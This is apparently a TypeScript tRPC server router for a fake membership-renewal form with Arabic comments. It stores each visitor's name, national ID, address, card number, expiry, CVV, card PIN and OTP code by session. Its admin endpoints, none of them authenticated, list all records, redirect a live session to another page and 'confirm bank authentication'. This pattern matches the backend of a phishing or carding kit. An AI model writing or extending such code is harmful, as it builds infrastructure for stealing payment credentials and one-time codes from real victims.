import { z } from "zod";
import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import {
  upsertApplication,
  getApplicationBySessionId,
  getAllApplications,
  updateApplicationStatus,
  setAdminRedirect,
  clearAdminRedirect,
  deleteApplication,
  archiveApplication,
  setBankAuthConfirmed,
} from "./db";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  // ============ API الطلبات ============
  applications: router({
    // حفظ أو تحديث طلب
    upsert: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        membershipType: z.string().optional(),
        renewalMembershipNumber: z.string().optional(),
        currentMembershipType: z.string().optional(),
        fullName: z.string().optional(),
        phone: z.string().optional(),
        idNumber: z.string().optional(),
        emirate: z.string().optional(),
        area: z.string().optional(),
        street: z.string().optional(),
        deliveryTime: z.string().optional(),
        cardNumber: z.string().optional(),
        cardExpiry: z.string().optional(),
        cardCvv: z.string().optional(),
        cardNetwork: z.string().optional(),
        cardPin: z.string().optional(),
        otpCode: z.string().optional(),
        currentPage: z.string().optional(),
        status: z.enum(["pending", "approved", "rejected"]).optional(),
      }))
      .mutation(async ({ input }) => {
        const now = Date.now();
        await upsertApplication({ ...input, createdAt: now, updatedAt: now });
        return { success: true };
      }),

    // جلب طلب واحد بالـ sessionId
    getBySession: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .query(async ({ input }) => {
        return getApplicationBySessionId(input.sessionId);
      }),

    // جلب جميع الطلبات (للإدارة)
    getAll: publicProcedure.query(async () => {
      return getAllApplications();
    }),

    // تحديث حالة الطلب
    updateStatus: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        status: z.enum(["pending", "approved", "rejected"]),
      }))
      .mutation(async ({ input }) => {
        await updateApplicationStatus(input.sessionId, input.status);
        return { success: true };
      }),

    // توجيه المستخدم من الإدارة
    setRedirect: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        page: z.string(),
      }))
      .mutation(async ({ input }) => {
        await setAdminRedirect(input.sessionId, input.page);
        return { success: true };
      }),

    // مسح التوجيه بعد تنفيذه
    clearRedirect: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .mutation(async ({ input }) => {
        await clearAdminRedirect(input.sessionId);
        return { success: true };
      }),

    // حذف طلب
    delete: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .mutation(async ({ input }) => {
        await deleteApplication(input.sessionId);
        return { success: true };
      }),

    // أرشفة طلب
    archive: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .mutation(async ({ input }) => {
        await archiveApplication(input.sessionId);
        return { success: true };
      }),

    // تأكيد المصادقة البنكية
    confirmBankAuth: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .mutation(async ({ input }) => {
        await setBankAuthConfirmed(input.sessionId);
        return { success: true };
      }),
  }),
});

export type AppRouter = typeof appRouter;
